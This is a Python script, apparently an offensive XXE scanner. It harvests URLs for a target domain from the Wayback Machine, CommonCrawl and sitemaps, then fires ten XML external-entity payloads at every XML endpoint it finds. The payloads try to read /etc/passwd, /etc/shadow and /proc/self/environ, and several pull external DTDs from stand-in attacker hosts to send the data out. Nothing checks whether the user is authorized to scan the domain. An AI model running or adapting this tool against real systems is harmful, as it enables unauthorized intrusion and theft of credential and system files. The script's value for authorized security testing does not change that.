import requests
import sqlite3
import argparse
import datetime
import logging
import html
from waybackpy import WaybackMachineCDXServerAPI
from bs4 import BeautifulSoup
from multiprocessing import Pool, cpu_count

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Database setup
def setup_database(db_name):
    conn = sqlite3.connect(db_name)
    c = conn.cursor()
    c.execute('''
        CREATE TABLE IF NOT EXISTS urls (
            id INTEGER PRIMARY KEY, 
            url TEXT UNIQUE
        )
    ''')
    c.execute('''
        CREATE TABLE IF NOT EXISTS responses (
            id INTEGER PRIMARY KEY, 
            url TEXT, 
            payload TEXT, 
            response TEXT, 
            timestamp TEXT
        )
    ''')
    conn.commit()
    return conn, c

# Extract URLs from Wayback Machine
def extract_wayback_urls(domain):
    wayback = WaybackMachineCDXServerAPI(domain)
    urls = []
    for snapshot in wayback.snapshots():
        try:
            urls.append(snapshot.archive_url)
        except AttributeError:
            continue
    logging.info(f"Extracted {len(urls)} URLs from Wayback Machine.")
    return urls

# Extract URLs from CommonCrawl
def extract_commoncrawl_urls(domain):
    index_url = f"https://index.commoncrawl.org/CC-MAIN-2024-30-index?url={domain}&output=json"
    response = requests.get(index_url)
    if response.status_code == 200:
        try:
            data = response.json()
            if isinstance(data, list):
                urls = [entry['url'] for entry in data]
            elif isinstance(data, dict):
                urls = [data['url']]
            logging.info(f"Extracted {len(urls)} URLs from CommonCrawl.")
            return urls
        except ValueError as e:
            logging.error(f"Error parsing JSON: {e}")
            logging.error(f"Response content: {response.content}")
            return []
    else:
        logging.error(f"Error fetching CommonCrawl data: {response.status_code}")
    return []

# Check for sitemap.xml
def check_sitemap(domain):
    sitemap_url = f"http://{domain}/sitemap.xml"
    response = requests.get(sitemap_url)
    if response.status_code == 200:
        logging.info(f"Sitemap found: {sitemap_url}")
        return [sitemap_url]
    else:
        logging.info("No sitemap found.")
        return []

# Filter and save URLs to database
def save_urls_to_db(urls, cursor, conn):
    xml_urls = [url for url in urls if ".xml" in url]
    for url in xml_urls:
        try:
            cursor.execute("INSERT OR IGNORE INTO urls (url) VALUES (?)", (url,))
        except sqlite3.IntegrityError:
            continue
    conn.commit()
    logging.info(f"Saved {len(xml_urls)} XML URLs to the database.")

# XXE Payloads
payloads = [
    """<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>""",
    """<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE data [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://malicious.com/evil.dtd">%dtd;]><data>&send;</data>""",
    """<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY % payload SYSTEM "http://malicious.com/payload.xml">%payload;]><foo>&send;</foo>""",
    """<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"><!ENTITY % d SYSTEM "http://malicious.com/evil.dtd">%d;]><foo>&send;</foo>""",
    """<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE data [<!ENTITY % xxe SYSTEM "file:///etc/shadow"><!ENTITY % d SYSTEM "http://malicious.com/evil.dtd">%d;]><data>&send;</data>""",
    """<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/?q="> ]><foo>&xxe;</foo>""",
    """<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE data [<!ENTITY % xxe SYSTEM "http://attacker.com/?q="> ]><data>&xxe;</data>""",
    """<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/hosts"><!ENTITY % d SYSTEM "http://malicious.com/evil.dtd">%d;]><foo>&send;</foo>""",
    """<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///proc/self/environ"><!ENTITY % d SYSTEM "http://malicious.com/evil.dtd">%d;]><foo>&send;</foo>""",
    """<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE data [<!ENTITY % file SYSTEM "file:///proc/self/cmdline"><!ENTITY % d SYSTEM "http://malicious.com/evil.dtd">%d;]><data>&send;</data>"""
    # Add more payloads for comprehensive testing
]

# Check if response indicates vulnerability
def is_vulnerable(response):
    # Advanced heuristic detection for vulnerabilities
    indicators = ['root:', 'password', 'shadow', 'bin/bash', 'uid=', 'gid=', 'etc/passwd', 'etc/shadow', 'private']
    return any(indicator in response for indicator in indicators)

# Function to send a payload and log response
def send_payload(args):
    url, payload, headers = args
    timestamp = datetime.datetime.now().isoformat()
    try:
        response = requests.post(url, data=payload, headers=headers)
        vulnerable = is_vulnerable(response.text)
        status = "Vulnerable" if vulnerable else "Secure"
        return (url, payload, f"{status}\n\n{response.text}", timestamp, status)
    except requests.exceptions.RequestException as e:
        return (url, payload, str(e), timestamp, "Error")

# Send XXE payloads and log responses with multiprocessing
def send_xxe_payloads(cursor, conn):
    cursor.execute("SELECT url FROM urls")
    urls = cursor.fetchall()

    headers = {"Content-Type": "application/xml"}
    pool = Pool(cpu_count())

    tasks = [(url[0], payload, headers) for url in urls for payload in payloads]
    results = pool.map(send_payload, tasks)

    for result in results:
        url, payload, response, timestamp, status = result
        cursor.execute("INSERT INTO responses (url, payload, response, timestamp) VALUES (?, ?, ?, ?)", 
                       (url, payload, response, timestamp))
        logging.info(f"Sent payload to {url} and received response: {status}")

    conn.commit()

# Generate HTML report
def generate_html_report(cursor):
    cursor.execute("SELECT * FROM responses")
    responses = cursor.fetchall()

    html_content = """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>XXE Scan Report</title>
        <style>
            table {
                width: 100%;
                border-collapse: collapse;
            }
            table, th, td {
                border: 1px solid black;
            }
            th, td {
                padding: 8px;
                text-align: left;
            }
            th {
                background-color: #f2f2f2;
            }
            .vulnerable {
                background-color: #f8d7da;
            }
            .not-vulnerable {
                background-color: #d4edda;
            }
        </style>
    </head>
    <body>
        <h1>XXE Scan Report</h1>
        <table>
            <tr>
                <th>URL</th>
                <th>Payload</th>
                <th>Response</th>
                <th>Timestamp</th>
                <th>Status</th>
            </tr>
    """

    for response in responses:
        status_class = "vulnerable" if "Vulnerable" in response[3] else "not-vulnerable"
        html_content += f"""
        <tr class="{status_class}">
            <td>{html.escape(response[1])}</td>
            <td><pre>{html.escape(response[2])}</pre></td>
            <td><pre>{html.escape(response[3])}</pre></td>
            <td>{html.escape(response[4])}</td>
            <td>{'Vulnerable' if 'Vulnerable' in response[3] else 'Secure'}</td>
        </tr>
        """

    html_content += """
        </table>
    </body>
    </html>
    """

    with open("xxereport.html", "w") as report_file:
        report_file.write(html_content)
    logging.info("HTML report generated: xxereport.html")

# Command-line interface
def main():
    parser = argparse.ArgumentParser(description="Extract URLs and test for XXE vulnerabilities.")
    parser.add_argument('-d', '--domain', required=True, help='Domain to extract URLs from')
    parser.add_argument('-db', '--database', default='xxe_test.db', help='SQLite database file name')
    parser.add_argument('-r', '--report', action='store_true', help='Generate report')
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output')

    args = parser.parse_args()

    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)

    conn, cursor = setup_database(args.database)

    logging.info(f"Starting URL extraction for domain: {args.domain}")
    wayback_urls = extract_wayback_urls(args.domain)
    commoncrawl_urls = extract_commoncrawl_urls(args.domain)
    sitemap_urls = check_sitemap(args.domain)

    all_urls = set(wayback_urls + commoncrawl_urls + sitemap_urls)
    save_urls_to_db(all_urls, cursor, conn)
    
    logging.info("Sending XXE payloads to extracted URLs.")
    send_xxe_payloads(cursor, conn)

    if args.report:
        generate_html_report(cursor)

    conn.close()
    logging.info("Completed all tasks.")

if __name__ == "__main__":
    main()
